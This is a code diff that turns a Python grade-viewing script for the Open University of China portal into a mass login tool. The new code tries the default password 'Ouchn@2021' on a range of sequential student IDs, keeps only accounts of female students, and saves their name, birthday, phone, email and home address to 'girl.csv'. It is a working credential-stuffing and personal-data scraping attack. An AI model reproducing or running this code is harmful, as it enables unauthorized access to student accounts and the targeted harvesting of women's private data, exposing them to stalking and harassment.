@@ -1,13 +1,20 @@
+#!/usr/bin/python3
+# -*- coding:utf-8 -*-
+"""
+@author: Jiong.L
+@time: 2023/2/5 11:53
+"""
 # -*- coding:utf-8 -*-
 import sys
 import time
+
+import pandas as pd
 import requests
 import re
 import js2py
 import base64
 import pickle
 import os
-from prettytable import PrettyTable
 import threading
 
 
@@ -125,37 +132,25 @@ class Ouchn(object):
             self.loignStatus = False
 
     def get_data(self):
-        test_url = 'https://menhu.pt.ouchn.cn/ouchnapp/wap/course/xskc-pc'
-        req: dict = self.session.post(test_url, data={'page': 1, 'page_size': 20}).json()
+        test_url = 'https://menhu.pt.ouchn.cn/ouchnproj/wap/xueji/index'
+        req: dict = self.session.post(test_url).json()
         if 'm' in req.keys() and req['m'] == "操作成功":
-            data = req['d']['list']
+            data: dict = req['d']['list'][0]
         else:
             return False
-        stu_data = {'name': self.name, 'test': [], 'exam': []}
-        for i in data:
-            sub_data = {
-                'sub_name': i['name'],
-                "completeness": i["completeness"],
-                "test": None
+        if data['xbm'] == '女':
+            mm_info = {
+                '学号': data['xh'],
+                '姓名': data['xm'],
+                '生日': data['csrq'],
+                '电话': data['sjh'],
+                '邮箱': data['dzyx'],
+                '地址': data['txdzxxdz']
             }
-            test_data = []
-            for each in i["activitys"]:
-                test_data.append(
-                    f'{each["name"]}:完成{each["completed"]}/{each["num"]}'
-                )
-            sub_data.update({"test": test_data})
-            stu_data['test'].append(sub_data)
+        else:
+            return False
 
-        exam_url2 = 'https://menhu.pt.ouchn.cn/ouchnapp/wap/cj/cj'
-        req1: dict = self.session.post(exam_url2).json()
-        if 'm' in req1.keys() and req1['m'] == "操作成功":
-            exam_ori = list(req1['d']['data'].values())[0]
-            exam_data = []
-            for each in exam_ori:
-                exam_data.append(f'{each["kcmc"]}:{each["cj"]}')
-            stu_data['exam'] += exam_data
-
-        return stu_data
+        return mm_info
 
     def tpl_write(self):
         now = int(time.time())
@@ -165,18 +160,6 @@ class Ouchn(object):
 
 
 def init():
-    tips = "*******请按照下面的格式写入账号密码********\n" \
-           "*************每行一个账号***************\n" \
-           "*******账号,密码（中间使用英文逗号隔开）****\n" \
-           "*                                    *\n" \
-           "*        123456789,password          *\n" \
-           "*        987654321,password          *\n" \
-           "*                                    *\n" \
-           "*==========在我下面填写账号=============*\n"
-    if 'count.txt' not in os.listdir('./'):
-        with open('./count.txt', 'w', encoding='utf-8') as f:
-            f.write(tips)
-            f.close()
     if 'tmp' in os.listdir('./'):
         return os.listdir('./tmp')
     else:
@@ -184,59 +167,46 @@ def init():
         init()
 
 
-def out_data(each_data):
-    tb = PrettyTable(title=each_data['name'], field_names=['科目', '学习进度', '作业完成情况'])
-    for each in each_data['test']:
-        tb.add_row([each['sub_name'], f"{each['completeness']}%", ','.join(each['test'])])
-    if len(tb.rows) > len(each_data['exam']):
-        num = len(tb.rows) - len(each_data['exam'])
-        each_data['exam'] += [i * '' for i in range(num)]
-    tb.add_column('考试成绩', [wa for wa in each_data['exam']])
-    print(tb)
-
-
-def read_user():
-    with open('./count.txt', 'r', encoding='utf-8') as f:
-        user_list = []
-        for each in f.readlines():
-            if '*' != each[0]:
-                each = each.replace('\n', '').split(',')
-
-                user_list.append(each)
-    if not user_list:
-        return None
-    return user_list
-
-
 if __name__ == '__main__':
     print('*' * 30 + '请耐心等待' + '*' * 30)
+    print('示意：2251001204320')
+    start_nums = int(input('请输入开始账号'))
+    end_nums = int(input('请输入需要爬取的数量'))
+    thread_nums = int(input('请输入线程数'))
     tmp_list = init()
-    list1 = read_user()
-    if not list1:
-        print('填写账号密码')
-        time.sleep(3)
-        sys.exit()
+    list1 = [i for i in range(start_nums, start_nums + end_nums)]
+
+    mm_list = []
 
 
     def threading_test(**kwargs):
         ouchn = Ouchn(kwargs['username'], kwargs['password'], tmp_list)
         if ouchn.loignStatus:
             data = ouchn.get_data()
-            out_data(data)
+            if data:
+                print(data)
+                mm_list.append(data)
+
         else:
             print(f'{kwargs["username"]}账号或密码错误')
+
 
     obj = {}
     for i in range(len(list1)):
         obj[i]: threading.Thread = threading.Thread(target=threading_test,
-                                                    kwargs={'tmplist': tmp_list, 'username': list1[i][0],
-                                                            'password': list1[i][1]})
+                                                    kwargs={'tmplist': tmp_list, 'username': list1[i],
+                                                            'password': 'Ouchn@2021'})
         obj[i].start()
         obj[i].join()
         while True:
-            if len(threading.enumerate()) < 3:
+            if len(threading.enumerate()) < 1 + thread_nums:
                 break
 
-    print('*' * 22 + '查询完毕，如需保存，请自行复制' + '*' * 22)
-    while True:
+    df = pd.DataFrame(columns=['学号', '姓名', '生日', '电话', '邮箱', '地址'])
+    for i in range(len(mm_list)):
+        df.loc[i] = mm_list[i]
+    if 'girl.csv' in os.listdir('./'):
+        df.to_csv('./girl.csv', encoding='utf_8_sig', mode='a', index=False, header=False)
         pass
+    else:
+        df.to_csv('./girl.csv', encoding='utf_8_sig')
